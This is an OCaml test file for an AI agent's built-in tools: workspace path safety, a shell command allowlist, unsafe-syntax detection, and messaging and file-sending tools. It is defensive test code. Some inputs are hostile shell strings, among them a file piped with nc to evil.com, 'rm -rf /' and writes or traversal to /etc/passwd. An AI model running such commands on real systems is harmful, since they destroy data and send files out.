(* Tests for Tools_builtin module (path safety, allowlist, etc.) *)

let ws = "/workspace/test"

let with_temp_workspace f =
  let dir = Filename.temp_file "clawq_tools_prop" "" in
  Sys.remove dir;
  Unix.mkdir dir 0o755;
  Fun.protect
    (fun () -> f dir)
    ~finally:(fun () -> try Unix.rmdir dir with _ -> ())

let process_exists pid =
  try
    Unix.kill pid 0;
    true
  with Unix.Unix_error _ -> false

let contains hay needle =
  try
    ignore (Str.search_forward (Str.regexp_string needle) hay 0);
    true
  with Not_found -> false

let extract_saved_output_path result =
  try
    ignore
      (Str.search_forward
         (Str.regexp "full stdout saved to \\([^ ]+\\)")
         result 0);
    Some (Str.matched_group 1 result)
  with Not_found -> None

let random_segment state =
  match Random.State.int state 10 with
  | 0 -> ""
  | 1 -> "."
  | 2 -> ".."
  | 3 -> "src"
  | 4 -> "lib"
  | 5 -> "tmp"
  | 6 -> Printf.sprintf "dir%d" (Random.State.int state 20)
  | 7 -> Printf.sprintf "file%d.txt" (Random.State.int state 20)
  | 8 -> "test-evil"
  | _ -> "nested"

let random_path_case state ~workspace =
  let seg_count = Random.State.int state 7 in
  let segs = List.init seg_count (fun _ -> random_segment state) in
  let body = String.concat "/" segs in
  match Random.State.int state 5 with
  | 0 -> body
  | 1 -> workspace ^ "/" ^ body
  | 2 -> "/tmp/" ^ body
  | 3 -> workspace ^ "/../" ^ body
  | _ -> workspace ^ "/./" ^ body

let random_shell_char state =
  let chars =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 \
     ./_-\"'\\;|&><`()$!\t\n\
     \r"
  in
  chars.[Random.State.int state (String.length chars)]

let random_shell_string state =
  let len = Random.State.int state 32 in
  String.init len (fun _ -> random_shell_char state)

let read_process_output_or_fail ~label cmd =
  let ic = Unix.open_process_in cmd in
  Fun.protect
    ~finally:(fun () ->
      match Unix.close_process_in ic with
      | Unix.WEXITED 0 -> ()
      | Unix.WEXITED code ->
          Alcotest.failf "%s failed (exit %d): %s" label code cmd
      | Unix.WSIGNALED signal | Unix.WSTOPPED signal ->
          Alcotest.failf "%s terminated by signal %d: %s" label signal cmd)
    (fun () -> input_line ic |> String.trim)

let run_command_or_fail ~label cmd =
  match Sys.command cmd with
  | 0 -> ()
  | code -> Alcotest.failf "%s failed (exit %d): %s" label code cmd

let assert_no_drift label =
  let path_drift, shell_drift, tokenizer_drift =
    Tools_builtin.get_drift_counters ()
  in
  Alcotest.(check int) (label ^ " path drift") 0 path_drift;
  Alcotest.(check int) (label ^ " shell drift") 0 shell_drift;
  Alcotest.(check int) (label ^ " tokenizer drift") 0 tokenizer_drift

let with_drift_check label f =
  Tools_builtin.reset_drift_counters ();
  Fun.protect f ~finally:(fun () -> assert_no_drift label)

(* --- normalize_path tests --- *)

let test_normalize_absolute () =
  let result = Tools_builtin.normalize_path "/foo/bar/baz" in
  Alcotest.(check string) "absolute path normalized" "/foo/bar/baz" result

let test_normalize_dot () =
  let result = Tools_builtin.normalize_path "/foo/./bar" in
  Alcotest.(check string) "dot removed" "/foo/bar" result

let test_normalize_dotdot () =
  let result = Tools_builtin.normalize_path "/foo/bar/../baz" in
  Alcotest.(check string) "dotdot resolved" "/foo/baz" result

let test_normalize_relative () =
  let result = Tools_builtin.normalize_path "foo/bar" in
  Alcotest.(check string) "relative path" "foo/bar" result

let test_normalize_empty_segments () =
  let result = Tools_builtin.normalize_path "/foo//bar" in
  Alcotest.(check string) "double slash normalized" "/foo/bar" result

(* --- is_path_safe tests (Coq-extracted) --- *)

let test_path_safe_inside_workspace () =
  with_drift_check "path safe inside workspace" (fun () ->
      let result =
        Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/file.txt")
      in
      Alcotest.(check bool) "file inside workspace is safe" true result)

let test_path_safe_workspace_root () =
  with_drift_check "path safe workspace root" (fun () ->
      let result = Tools_builtin.is_path_safe ~workspace:ws ws in
      Alcotest.(check bool) "workspace root itself is safe" true result)

let test_path_safe_outside_workspace () =
  with_drift_check "path safe outside workspace" (fun () ->
      let result = Tools_builtin.is_path_safe ~workspace:ws "/etc/passwd" in
      Alcotest.(check bool) "outside workspace is unsafe" false result)

let test_path_safe_dotdot_escape () =
  with_drift_check "path safe dotdot escape" (fun () ->
      let result =
        Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/../etc/passwd")
      in
      Alcotest.(check bool) "dotdot escape is unsafe" false result)

let test_path_safe_sibling_dir () =
  (* /workspace/test2 is a sibling, not inside /workspace/test *)
  with_drift_check "path safe sibling dir" (fun () ->
      let result =
        Tools_builtin.is_path_safe ~workspace:ws "/workspace/test2/file"
      in
      Alcotest.(check bool) "sibling dir is unsafe" false result)

let test_path_safe_nested () =
  with_drift_check "path safe nested" (fun () ->
      let result =
        Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/a/b/c/deep/file.ml")
      in
      Alcotest.(check bool) "deeply nested path is safe" true result)

let test_path_safe_prefix_trick () =
  (* /workspace/test-evil should not match /workspace/test *)
  with_drift_check "path safe prefix trick" (fun () ->
      let result =
        Tools_builtin.is_path_safe ~workspace:ws "/workspace/test-evil/file"
      in
      Alcotest.(check bool) "prefix trick is unsafe" false result)

(* --- is_command_allowed tests --- *)

let test_command_allowed_in_list () =
  let allowed = [ "ls"; "cat"; "grep" ] in
  Alcotest.(check bool)
    "ls is allowed" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "ls /tmp")

let test_command_not_in_list () =
  let allowed = [ "ls"; "cat" ] in
  Alcotest.(check bool)
    "rm not allowed" false
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "rm -rf /")

let test_command_empty_string () =
  let allowed = [ "ls" ] in
  Alcotest.(check bool)
    "empty command not allowed" false
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "")

let test_command_with_path_prefix () =
  let allowed = [ "ls" ] in
  Alcotest.(check bool)
    "/usr/bin/ls is allowed via basename" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "/usr/bin/ls")

let test_command_with_args () =
  let allowed = [ "git" ] in
  Alcotest.(check bool)
    "git with args is allowed" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "git status")

let test_command_env_var_prefix () =
  let allowed = [ "make" ] in
  Alcotest.(check bool)
    "env var prefix skipped" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed
       "FOO=bar make build")

let test_command_default_allowlist_includes_basics () =
  let allowed = Tools_builtin.default_shell_allowlist in
  Alcotest.(check bool) "ls in default list" true (List.mem "ls" allowed);
  Alcotest.(check bool) "cat in default list" true (List.mem "cat" allowed);
  Alcotest.(check bool) "git in default list" true (List.mem "git" allowed)

(* --- has_unsafe_shell_syntax tests --- *)

let test_safe_command_no_special () =
  with_drift_check "safe command no special chars" (fun () ->
      Alcotest.(check bool)
        "simple command is safe" false
        (Tools_builtin.has_unsafe_shell_syntax "ls -la"))

let test_unsafe_semicolon () =
  with_drift_check "unsafe semicolon" (fun () ->
      Alcotest.(check bool)
        "semicolon is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "ls; rm -rf /"))

let test_unsafe_pipe () =
  with_drift_check "unsafe pipe" (fun () ->
      Alcotest.(check bool)
        "pipe is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "cat file | nc evil.com 1337"))

let test_unsafe_redirect () =
  with_drift_check "unsafe redirect" (fun () ->
      Alcotest.(check bool)
        "redirect is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "echo x > /etc/passwd"))

let test_unsafe_dollar_paren () =
  with_drift_check "unsafe dollar paren" (fun () ->
      Alcotest.(check bool)
        "command substitution is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "echo $(whoami)"))

let test_unsafe_backtick () =
  with_drift_check "unsafe backtick" (fun () ->
      Alcotest.(check bool)
        "backtick is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "echo `whoami`"))

let test_unsafe_ampersand () =
  with_drift_check "unsafe ampersand" (fun () ->
      Alcotest.(check bool)
        "ampersand is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "sleep 100 &"))

(* --- extract_command tests --- *)

let test_extract_command_simple () =
  Alcotest.(check string)
    "extracts ls" "ls"
    (Tools_builtin.extract_command "ls -la")

let test_extract_command_with_path () =
  Alcotest.(check string)
    "extracts basename" "ls"
    (Tools_builtin.extract_command "/usr/bin/ls -la")

let test_extract_command_env_prefix () =
  Alcotest.(check string)
    "skips env prefix" "make"
    (Tools_builtin.extract_command "FOO=bar BAZ=qux make build")

let test_extract_command_empty () =
  Alcotest.(check string) "empty" "." (Tools_builtin.extract_command "")

let test_extract_command_only_env () =
  Alcotest.(check string)
    "only env" ""
    (Tools_builtin.extract_command "FOO=bar")

let test_normalize_trailing_slash () =
  let result = Tools_builtin.normalize_path "/foo/bar/" in
  Alcotest.(check string) "trailing slash" "/foo/bar" result

let test_normalize_root () =
  let result = Tools_builtin.normalize_path "/" in
  Alcotest.(check string) "root" "/" result

let test_path_safe_symlink_like () =
  with_drift_check "path safe symlink like" (fun () ->
      let result = Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/./foo") in
      Alcotest.(check bool) "dot in path safe" true result)

let test_unsafe_double_ampersand () =
  with_drift_check "unsafe double ampersand" (fun () ->
      Alcotest.(check bool)
        "double amp" true
        (Tools_builtin.has_unsafe_shell_syntax "ls && rm -rf /"))

let test_safe_single_command_with_flags () =
  with_drift_check "safe command with flags" (fun () ->
      Alcotest.(check bool)
        "flags safe" false
        (Tools_builtin.has_unsafe_shell_syntax "git log --oneline -n 10"))

let test_path_safe_symlink_resolves_inside_workspace () =
  with_temp_workspace (fun workspace ->
      with_drift_check "path safe symlink resolves inside workspace" (fun () ->
          let real_dir = Filename.concat workspace "real" in
          let real_file = Filename.concat real_dir "note.txt" in
          let link_dir = Filename.concat workspace "link" in
          Unix.mkdir real_dir 0o755;
          let oc = open_out real_file in
          output_string oc "ok\n";
          close_out oc;
          Unix.symlink real_dir link_dir;
          let result =
            Tools_builtin.is_path_safe ~workspace
              (Filename.concat link_dir "note.txt")
          in
          Alcotest.(check bool)
            "symlink into workspace remains safe" true result;
          Sys.remove real_file;
          Unix.unlink link_dir;
          Unix.rmdir real_dir))

let test_path_safety_random_conformance () =
  let state = Random.State.make [| 0xC1; 0xA0; 0x42 |] in
  with_temp_workspace (fun workspace ->
      Tools_builtin.reset_drift_counters ();
      for _ = 1 to 500 do
        let path = random_path_case state ~workspace in
        let resolved_for_coq =
          if Filename.is_relative path then Filename.concat workspace path
          else path
        in
        let expected =
          Tools_builtin.is_path_safe_coq ~workspace resolved_for_coq
          && Tools_builtin.is_path_safe_ocaml ~workspace path
        in
        let actual = Tools_builtin.is_path_safe ~workspace path in
        Alcotest.(check bool)
          (Printf.sprintf "path conformance for %S" path)
          expected actual
      done;
      assert_no_drift "path random conformance")

let test_shell_safety_random_conformance () =
  let state = Random.State.make [| 0x51; 0xE1; 0x99 |] in
  let commands =
    [
      "";
      "ls $HOME";
      "echo !";
      "printf 'unterminated";
      "printf \"unterminated";
      "echo \"a\\\"b\"";
      "line1\nline2";
      "line1\rline2";
      "caf\195\169";
      "snowman-\226\152\131";
      "emoji-\240\159\152\128";
    ]
    @ List.init 500 (fun _ -> random_shell_string state)
  in
  with_drift_check "shell random conformance" (fun () ->
      List.iter
        (fun cmd ->
          let expected_unsafe =
            Tools_builtin.has_unsafe_shell_syntax_ocaml cmd
          in
          let actual_unsafe = Tools_builtin.has_unsafe_shell_syntax cmd in
          Alcotest.(check bool)
            (Printf.sprintf "shell syntax conformance for %S" cmd)
            expected_unsafe actual_unsafe;
          let expected_split = Tools_builtin.split_command_words_ocaml cmd in
          let actual_split = Tools_builtin.split_command_words cmd in
          Alcotest.(check (result (list string) string))
            (Printf.sprintf "shell tokenizer conformance for %S" cmd)
            expected_split actual_split)
        commands)

let make_tmp_workspace () =
  let dir =
    Filename.get_temp_dir_name ()
    ^ "/clawq_doc_test_"
    ^ string_of_int (Random.int 100000)
  in
  (try Sys.mkdir dir 0o755 with _ -> ());
  dir

let test_doc_write_creates () =
  let dir = make_tmp_workspace () in
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("filename", `String "TOOLS.md");
              ("content", `String "hello world");
            ]))
  in
  Alcotest.(check bool)
    "written" true
    (try
       ignore (Str.search_forward (Str.regexp_string "Written") result 0);
       true
     with Not_found -> false);
  let content =
    let ic = open_in (Filename.concat dir "TOOLS.md") in
    let s = input_line ic in
    close_in ic;
    s
  in
  Alcotest.(check string) "content matches" "hello world" content;
  Sys.remove (Filename.concat dir "TOOLS.md");
  try Sys.rmdir dir with _ -> ()

let test_doc_write_appends () =
  let dir = make_tmp_workspace () in
  let path = Filename.concat dir "NOTES.md" in
  let oc = open_out path in
  output_string oc "first\n";
  close_out oc;
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("filename", `String "NOTES.md");
              ("content", `String "second\n");
              ("append", `Bool true);
            ]))
  in
  Alcotest.(check bool)
    "appended" true
    (try
       ignore (Str.search_forward (Str.regexp_string "Appended") result 0);
       true
     with Not_found -> false);
  let ic = open_in path in
  let content = really_input_string ic (in_channel_length ic) in
  close_in ic;
  Alcotest.(check string) "content appended" "first\nsecond\n" content;
  Sys.remove path;
  try Sys.rmdir dir with _ -> ()

let test_doc_write_rejects_traversal () =
  let dir = make_tmp_workspace () in
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("filename", `String "../etc/passwd"); ("content", `String "hack");
            ]))
  in
  Alcotest.(check bool)
    "rejected" true
    (try
       ignore (Str.search_forward (Str.regexp_string "Error:") result 0);
       true
     with Not_found -> false);
  try Sys.rmdir dir with _ -> ()

let test_send_message_uses_send_fn_over_send_progress () =
  let send_fn_called = ref [] in
  let send_progress_called = ref false in
  let tool =
    Tools_builtin.send_message ~rich_send_fn:None
      ~send_fn:
        (Some
           (fun ~text ->
             send_fn_called := text :: !send_fn_called;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run
      (tool.invoke
         ~context:
           {
             Tool.session_key = Some "telegram:1:1";
             send_progress =
               Some
                 (fun _text ->
                   send_progress_called := true;
                   Lwt.return_unit);
             interrupt_check = None;
             inject_system_messages = None;
             effective_cwd = None;
             request_cwd_change = None;
           }
         (`Assoc [ ("text", `String "status update") ]))
  in
  Alcotest.(check string) "tool result" "Message sent" result;
  Alcotest.(check (list string))
    "send_fn used" [ "status update" ] (List.rev !send_fn_called);
  Alcotest.(check bool) "send_progress not used" false !send_progress_called

let test_send_message_falls_back_to_notify_channel () =
  let sent = ref [] in
  let tool =
    Tools_builtin.send_message ~rich_send_fn:None
      ~send_fn:
        (Some
           (fun ~text ->
             sent := text :: !sent;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run (tool.invoke (`Assoc [ ("text", `String "fallback update") ]))
  in
  Alcotest.(check string) "tool result" "Message sent" result;
  Alcotest.(check (list string))
    "fallback send used" [ "fallback update" ] (List.rev !sent)

let test_send_message_errors_without_any_notifier () =
  let tool = Tools_builtin.send_message ~send_fn:None ~rich_send_fn:None in
  let result =
    Lwt_main.run (tool.invoke (`Assoc [ ("text", `String "hello") ]))
  in
  Alcotest.(check bool)
    "error reported" true
    (String.starts_with ~prefix:"Error: no active session notifier" result)

let test_send_message_with_buttons_rich_notifier () =
  let received = ref None in
  let rich_send_fn =
    Some
      (fun ~session_key:_ msg ->
        received := Some msg;
        Lwt.return
          Rich_message.
            { message_id = "42"; callback_ids = [ "cb_0_abc"; "cb_1_def" ] })
  in
  let tool = Tools_builtin.send_message ~send_fn:None ~rich_send_fn in
  let result =
    Lwt_main.run
      (tool.invoke
         ~context:
           {
             Tool.session_key = Some "telegram:1:1";
             send_progress = None;
             interrupt_check = None;
             inject_system_messages = None;
             effective_cwd = None;
             request_cwd_change = None;
           }
         (`Assoc
            [
              ("text", `String "Pick one:");
              ( "buttons",
                `List
                  [
                    `Assoc [ ("label", `String "Option A") ];
                    `Assoc [ ("label", `String "Option B") ];
                  ] );
            ]))
  in
  Alcotest.(check bool)
    "result mentions buttons" true
    (contains result "2 button(s)");
  Alcotest.(check bool)
    "result has message_id" true
    (contains result "message_id=42");
  match !received with
  | Some (Rich_message.TextWithButtons { text; button_rows }) ->
      Alcotest.(check string) "text" "Pick one:" text;
      Alcotest.(check int) "button rows" 1 (List.length button_rows);
      Alcotest.(check int)
        "buttons in row" 2
        (List.length (List.hd button_rows))
  | _ -> Alcotest.fail "expected TextWithButtons"

let test_send_message_with_buttons_text_fallback () =
  let sent = ref [] in
  let tool =
    Tools_builtin.send_message ~rich_send_fn:None
      ~send_fn:
        (Some
           (fun ~text ->
             sent := text :: !sent;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("text", `String "Choose:");
              ( "buttons",
                `List
                  [
                    `Assoc [ ("label", `String "Yes") ];
                    `Assoc [ ("label", `String "No") ];
                  ] );
            ]))
  in
  Alcotest.(check bool)
    "result mentions text fallback" true
    (contains result "buttons rendered as text");
  Alcotest.(check bool) "sent something" true (List.length !sent = 1);
  let text = List.hd !sent in
  Alcotest.(check bool)
    "contains numbered buttons" true (contains text "1. Yes");
  Alcotest.(check bool) "contains second button" true (contains text "2. No")

let test_send_message_plain_text_via_rich_notifier () =
  let rich_received = ref None in
  let send_fn_called = ref false in
  let rich_send_fn =
    Some
      (fun ~session_key:_ msg ->
        rich_received := Some msg;
        Lwt.return Rich_message.{ message_id = "0"; callback_ids = [] })
  in
  let tool =
    Tools_builtin.send_message ~rich_send_fn
      ~send_fn:
        (Some
           (fun ~text:_ ->
             send_fn_called := true;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run
      (tool.invoke
         ~context:
           {
             Tool.session_key = Some "telegram:1:1";
             send_progress = None;
             interrupt_check = None;
             inject_system_messages = None;
             effective_cwd = None;
             request_cwd_change = None;
           }
         (`Assoc [ ("text", `String "plain text update") ]))
  in
  Alcotest.(check string) "tool result" "Message sent" result;
  Alcotest.(check bool) "send_fn not called" false !send_fn_called;
  match !rich_received with
  | Some (Rich_message.Text text) ->
      Alcotest.(check string) "text routed via rich" "plain text update" text
  | _ -> Alcotest.fail "expected Rich_message.Text via rich_send_fn"

let test_send_message_plain_text_rich_fallback_no_session () =
  let send_fn_called = ref [] in
  let rich_send_fn_called = ref false in
  let rich_send_fn =
    Some
      (fun ~session_key:_ _msg ->
        rich_send_fn_called := true;
        Lwt.return Rich_message.{ message_id = "0"; callback_ids = [] })
  in
  let tool =
    Tools_builtin.send_message ~rich_send_fn
      ~send_fn:
        (Some
           (fun ~text ->
             send_fn_called := text :: !send_fn_called;
             Lwt.return_unit))
  in
  (* No context = no session_key, should fall back to send_fn *)
  let result =
    Lwt_main.run (tool.invoke (`Assoc [ ("text", `String "no session msg") ]))
  in
  Alcotest.(check string) "tool result" "Message sent" result;
  Alcotest.(check bool) "rich_send_fn not called" false !rich_send_fn_called;
  Alcotest.(check (list string))
    "send_fn used as fallback" [ "no session msg" ] (List.rev !send_fn_called)

let test_send_poll_rich_notifier () =
  let received = ref None in
  let rich_send_fn =
    Some
      (fun ~session_key:_ msg ->
        received := Some msg;
        Lwt.return Rich_message.{ message_id = "99"; callback_ids = [] })
  in
  let tool = Tools_builtin.send_poll ~rich_send_fn ~send_fn:None in
  let result =
    Lwt_main.run
      (tool.invoke
         ~context:
           {
             Tool.session_key = Some "telegram:1:1";
             send_progress = None;
             interrupt_check = None;
             inject_system_messages = None;
             effective_cwd = None;
             request_cwd_change = None;
           }
         (`Assoc
            [
              ("question", `String "Best color?");
              ( "options",
                `List [ `String "Red"; `String "Blue"; `String "Green" ] );
            ]))
  in
  Alcotest.(check bool)
    "result mentions poll sent" true
    (contains result "Poll sent");
  Alcotest.(check bool)
    "result has message_id" true
    (contains result "message_id=99");
  match !received with
  | Some (Rich_message.Poll { question; options; allows_multiple }) ->
      Alcotest.(check string) "question" "Best color?" question;
      Alcotest.(check int) "options count" 3 (List.length options);
      Alcotest.(check bool) "allows_multiple" false allows_multiple
  | _ -> Alcotest.fail "expected Poll"

let test_send_poll_text_fallback () =
  let sent = ref [] in
  let tool =
    Tools_builtin.send_poll ~rich_send_fn:None
      ~send_fn:
        (Some
           (fun ~text ->
             sent := text :: !sent;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("question", `String "Favorite?");
              ("options", `List [ `String "A"; `String "B" ]);
            ]))
  in
  Alcotest.(check bool)
    "result mentions text" true
    (contains result "rendered as text");
  Alcotest.(check bool) "sent something" true (List.length !sent = 1);
  let text = List.hd !sent in
  Alcotest.(check bool) "contains question" true (contains text "Favorite?");
  Alcotest.(check bool) "contains option 1" true (contains text "1. A");
  Alcotest.(check bool) "contains option 2" true (contains text "2. B")

let test_send_poll_validation () =
  let tool = Tools_builtin.send_poll ~rich_send_fn:None ~send_fn:None in
  let result_empty_q =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("question", `String "");
              ("options", `List [ `String "A"; `String "B" ]);
            ]))
  in
  Alcotest.(check bool)
    "empty question error" true
    (contains result_empty_q "'question'" && contains result_empty_q "send_poll");
  let result_too_few =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("question", `String "Q?");
              ("options", `List [ `String "Only one" ]);
            ]))
  in
  Alcotest.(check bool)
    "too few options error" true
    (contains result_too_few "at least 2");
  let result_too_many =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("question", `String "Q?");
              ( "options",
                `List (List.init 11 (fun i -> `String (string_of_int i))) );
            ]))
  in
  Alcotest.(check bool)
    "too many options error" true
    (contains result_too_many "at most 10")

let test_rich_message_to_fallback_text () =
  let text_msg = Rich_message.Text "hello" in
  Alcotest.(check string)
    "Text fallback" "hello"
    (Rich_message.to_fallback_text text_msg);
  let btn_msg =
    Rich_message.TextWithButtons
      {
        text = "Choose:";
        button_rows =
          [
            [
              Rich_message.{ label = "A"; callback_id = "cb_0" };
              Rich_message.{ label = "B"; callback_id = "cb_1" };
            ];
          ];
      }
  in
  let btn_text = Rich_message.to_fallback_text btn_msg in
  Alcotest.(check bool)
    "buttons fallback has text" true
    (contains btn_text "Choose:");
  Alcotest.(check bool)
    "buttons fallback has 1. A" true (contains btn_text "1. A");
  Alcotest.(check bool)
    "buttons fallback has 2. B" true (contains btn_text "2. B");
  let poll_msg =
    Rich_message.Poll
      {
        question = "Best?";
        options = [ "X"; "Y"; "Z" ];
        allows_multiple = false;
      }
  in
  let poll_text = Rich_message.to_fallback_text poll_msg in
  Alcotest.(check bool)
    "poll fallback has question" true
    (contains poll_text "Best?");
  Alcotest.(check bool)
    "poll fallback has 1. X" true
    (contains poll_text "1. X");
  Alcotest.(check bool)
    "poll fallback has 3. Z" true
    (contains poll_text "3. Z")

let test_file_attachment_fallback_text_with_url () =
  let msg =
    Rich_message.FileAttachment
      {
        filename = "report.csv";
        content = "a,b,c";
        content_type = "text/csv";
        description = "Monthly report";
        download_url = Some "https://example.com/downloads/abc123";
      }
  in
  let text = Rich_message.to_fallback_text msg in
  Alcotest.(check bool)
    "has description and filename" true
    (contains text "Monthly report (report.csv)");
  Alcotest.(check bool) "has download URL" true (contains text "Download: ");
  Alcotest.(check bool)
    "has actual URL" true
    (contains text "https://example.com/downloads/abc123")

let test_file_attachment_fallback_text_no_url () =
  let msg =
    Rich_message.FileAttachment
      {
        filename = "data.json";
        content = "{}";
        content_type = "application/json";
        description = "";
        download_url = None;
      }
  in
  let text = Rich_message.to_fallback_text msg in
  Alcotest.(check bool) "uses filename as desc" true (contains text "data.json");
  Alcotest.(check bool)
    "says file attached" true
    (contains text "(file attached)")

let test_file_attachment_fallback_text_empty_desc () =
  let msg =
    Rich_message.FileAttachment
      {
        filename = "output.txt";
        content = "hello";
        content_type = "text/plain";
        description = "";
        download_url = Some "https://example.com/dl/xyz";
      }
  in
  let text = Rich_message.to_fallback_text msg in
  Alcotest.(check bool)
    "uses filename when no description" true
    (contains text "output.txt");
  Alcotest.(check bool)
    "has download URL" true
    (contains text "https://example.com/dl/xyz")

let test_send_file_with_content () =
  let sent_text = ref [] in
  let rich_sent = ref [] in
  let store_url = ref None in
  let tool =
    Tools_builtin.send_file ~workspace:"/workspace" ~workspace_only:false
      ~extra_allowed_paths:[]
      ~send_fn:
        (Some
           (fun ~text ->
             sent_text := text :: !sent_text;
             Lwt.return_unit))
      ~rich_send_fn:
        (Some
           (fun ~session_key:_ msg ->
             rich_sent := msg :: !rich_sent;
             Lwt.return Rich_message.{ message_id = "0"; callback_ids = [] }))
      ~store_file:
        (Some
           (fun ~content:_ ~content_type:_ ~filename:_ ->
             let url = "https://example.com/downloads/test123" in
             store_url := Some url;
             Some url))
  in
  let result =
    Lwt_main.run
      (tool.invoke
         ~context:
           {
             Tool.session_key = Some "telegram:1:1";
             send_progress = None;
             interrupt_check = None;
             inject_system_messages = None;
             effective_cwd = None;
             request_cwd_change = None;
           }
         (`Assoc
            [
              ("content", `String "hello world");
              ("filename", `String "test.txt");
              ("description", `String "A test file");
            ]))
  in
  Alcotest.(check bool)
    "result mentions file sent" true
    (contains result "File sent: test.txt");
  Alcotest.(check bool)
    "result has download URL" true
    (contains result "https://example.com/downloads/test123");
  Alcotest.(check bool) "result has size" true (contains result "11 bytes");
  Alcotest.(check bool)
    "send_fn called with download link" true
    (List.exists (fun t -> contains t "Download:") !sent_text);
  Alcotest.(check bool) "rich_send_fn called" true (List.length !rich_sent = 1)

let test_send_file_with_workspace_path () =
  let dir = make_tmp_workspace () in
  let file_path = Filename.concat dir "hello.txt" in
  let oc = open_out file_path in
  output_string oc "file content here";
  close_out oc;
  let sent_text = ref [] in
  let tool =
    Tools_builtin.send_file ~workspace:dir ~workspace_only:false
      ~extra_allowed_paths:[]
      ~send_fn:
        (Some
           (fun ~text ->
             sent_text := text :: !sent_text;
             Lwt.return_unit))
      ~rich_send_fn:None
      ~store_file:
        (Some
           (fun ~content:_ ~content_type:_ ~filename:_ ->
             Some "https://example.com/downloads/abc"))
  in
  let result =
    Lwt_main.run (tool.invoke (`Assoc [ ("path", `String file_path) ]))
  in
  Alcotest.(check bool)
    "result mentions file sent" true
    (contains result "File sent: hello.txt");
  Alcotest.(check bool)
    "result has download URL" true
    (contains result "https://example.com/downloads/abc");
  Alcotest.(check bool) "result has size" true (contains result "17 bytes");
  Alcotest.(check bool) "send_fn called" true (List.length !sent_text = 1);
  Sys.remove file_path;
  try Unix.rmdir dir with _ -> ()

let test_send_file_validation_neither () =
  let tool =
    Tools_builtin.send_file ~workspace:"/workspace" ~workspace_only:false
      ~extra_allowed_paths:[] ~send_fn:None ~rich_send_fn:None ~store_file:None
  in
  let result = Lwt_main.run (tool.invoke (`Assoc [])) in
  Alcotest.(check bool)
    "error mentions path or content" true
    (contains result "'path' or 'content' is required")

let test_send_file_validation_both () =
  let tool =
    Tools_builtin.send_file ~workspace:"/workspace" ~workspace_only:false
      ~extra_allowed_paths:[] ~send_fn:None ~rich_send_fn:None ~store_file:None
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc [ ("path", `String "/some/file"); ("content", `String "data") ]))
  in
  Alcotest.(check bool)
    "error mentions mutually exclusive" true
    (contains result "mutually exclusive")

let test_send_file_content_requires_filename () =
  let tool =
    Tools_builtin.send_file ~workspace:"/workspace" ~workspace_only:false
      ~extra_allowed_paths:[] ~send_fn:None ~rich_send_fn:None
      ~store_file:
        (Some (fun ~content:_ ~content_type:_ ~filename:_ -> Some "url"))
  in
  let result =
    Lwt_main.run (tool.invoke (`Assoc [ ("content", `String "some data") ]))
  in
  Alcotest.(check bool)
    "error mentions filename required" true
    (contains result "'filename' is required")

let test_send_file_no_store () =
  let tool =
    Tools_builtin.send_file ~workspace:"/workspace" ~workspace_only:false
      ~extra_allowed_paths:[]
      ~send_fn:(Some (fun ~text:_ -> Lwt.return_unit))
      ~rich_send_fn:None ~store_file:None
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [ ("content", `String "data"); ("filename", `String "test.txt") ]))
  in
  Alcotest.(check bool)
    "error mentions no public base URL" true
    (contains result "no public base URL")

let test_guess_content_type () =
  Alcotest.(check string)
    "txt" "text/plain"
    (Tools_builtin.guess_content_type "file.txt");
  Alcotest.(check string)
    "json" "application/json"
    (Tools_builtin.guess_content_type "data.json");
  Alcotest.(check string)
    "csv" "text/csv"
    (Tools_builtin.guess_content_type "report.csv");
  Alcotest.(check string)
    "pdf" "application/pdf"
    (Tools_builtin.guess_content_type "doc.pdf");
  Alcotest.(check string)
    "png" "image/png"
    (Tools_builtin.guess_content_type "image.png");
  Alcotest.(check string)
    "jpg" "image/jpeg"
    (Tools_builtin.guess_content_type "photo.jpg");
  Alcotest.(check string)
    "html" "text/html"
    (Tools_builtin.guess_content_type "page.html");
  Alcotest.(check string)
    "ml" "text/x-ocaml"
    (Tools_builtin.guess_content_type "main.ml");
  Alcotest.(check string)
    "zip" "application/zip"
    (Tools_builtin.guess_content_type "archive.zip");
  Alcotest.(check string)
    "unknown" "application/octet-stream"
    (Tools_builtin.guess_content_type "file.xyz123")

let test_connector_capabilities_can_send_files () =
  Alcotest.(check bool)
    "telegram can_send_files" true
    Connector_capabilities.telegram.can_send_files;
  Alcotest.(check bool)
    "teams can_send_files" true Connector_capabilities.teams.can_send_files;
  Alcotest.(check bool)
    "discord cannot send files" false
